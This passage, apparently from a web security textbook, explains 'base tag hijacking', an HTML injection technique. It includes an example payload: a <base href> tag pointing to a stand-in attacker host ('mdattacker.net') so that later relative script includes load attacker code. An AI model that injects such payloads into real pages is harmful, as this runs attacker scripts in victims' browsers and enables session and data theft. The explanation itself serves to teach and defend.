In some situations, you may be able to introduce new tags with various names but not find any means of using these to directly
execute code. In these situations, you may be able to deliver an attack using a technique known as “base tag hijacking.” 
The <base> tag is used to specify a URL that the browser should use to resolve any relative URLs that appear subsequently 
within the page. If you can introduce a new <base> tag, and the page performs any <script> includes after your reflection 
point using relative URLs, you can specify a base URL to a server that you control. When the browser loads the scripts 
specified in the remainder of the HTML page, they are loaded from the server you specified, yet they are still executed in 
the context of the page that has invoked them. For example: 

<base href="http://mdattacker.net/badscripts/">
...
<script src="goodscript.js"></script>
 According to specifications, <base> tags should appear within the <head> section of the HTML page. However, some browsers, 
 including Firefox, accept <base> tags appearing anywhere in the page, considerably widening the scope of this attack.
